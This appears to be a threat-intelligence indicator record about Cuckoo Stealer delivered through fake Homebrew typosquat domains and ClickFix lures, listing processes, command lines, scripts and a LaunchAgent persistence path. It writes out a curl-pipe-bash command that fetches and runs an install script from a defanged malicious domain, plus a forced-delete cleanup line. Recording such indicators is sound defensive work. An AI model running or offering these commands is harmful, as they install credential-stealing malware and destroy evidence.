title: Fake Homebrew Typosquats Used to Deliver Cuckoo Stealer via ClickFix
description: The malware moves quickly to harvest credentials, establish persistence,
  encrypt C2 traffic, and systematically collect browser data, wallet files, Keychain
  contents, messaging sessions, and local documents.
attribution: ''
malware_families:
- Cuckoo Stealer
cves: []
ttps:
  processes:
  - bash
  - curl
  command_lines:
  - /bin/bash -c "$(curl -fsSL https://raw.homabrews[.]org/Homebrew/install/HEAD/install.sh)"
  - curl - bash downloads and executes payload
  - screencapture -x screenshots taken
  powershell: []
  scripts:
  - set volume output muted true
  - sleep 3; rm -rf '%s'
  registry_keys:
  - ~/Library/LaunchAgents/com.homebrew.brewupdater.plist
